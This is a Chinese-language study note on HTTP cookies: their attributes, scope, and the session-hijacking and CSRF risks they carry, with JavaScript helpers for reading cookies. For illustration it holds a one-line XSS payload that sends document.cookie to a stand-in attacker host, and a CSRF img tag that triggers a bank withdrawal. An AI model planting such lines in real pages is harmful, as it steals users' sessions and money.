# cookie

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

> - 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
> - 个性化设置（如用户自定义设置、主题等）
> - 浏览器行为跟踪（如跟踪分析用户行为等）

会话期 cookie:没有设定过期时间，会话结束，自动删除，具体看浏览器的实现，有的浏览器会有保活机制。
持久性 cookie:cookie 设定了 Expires 过期时间或者 Max-age 有效期。

cookie 的 secure 标记是给 https 的站点使用的，有一定安全性，但不是万能的。
cookie 的 httponly 标记，表示不能被 js 读取

Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。
Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。
例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。
Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
例如，设置 Path=/docs，则以下地址都会匹配：
/docs
/docs/Web/
/docs/Web/HTTP

SameSite Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前 SameSite Cookie 还处于实验阶段，并不是所有浏览器都支持。

---

会话劫持和 XSS:
在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

跨站请求伪造（CSRF）:
维基百科已经给了一个比较好的 CSRF 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：
对用户输入进行过滤来阻止 XSS；
任何敏感操作都需要确认；
用于敏感信息的 Cookie 只能拥有较短的生命周期；

```javascript
function getCookie(name) {
  var arr,
    reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");

  if ((arr = document.cookie.match(reg))) return unescape(arr[2]);
  else return null;
}

function parseCookie() {
  var cookie = document.cookie,
    pattern = /([^=]+)=([^;]+);?\s*/g,
    result,
    value = {};
  while ((result = pattern.exec(cookie)) != null) {
    value[result[1]] = result[2];
  }
  return value;
}
```

cookie 的封装库有很多，这里推荐一个，[看这里](https://github.com/js-cookie/js-cookie)

> some blog

[cookies](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)

[zakas](https://humanwhocodes.com/blog/2009/05/05/http-cookies-explained/)

[csdn](https://blog.csdn.net/yiifaa/article/details/78471252)
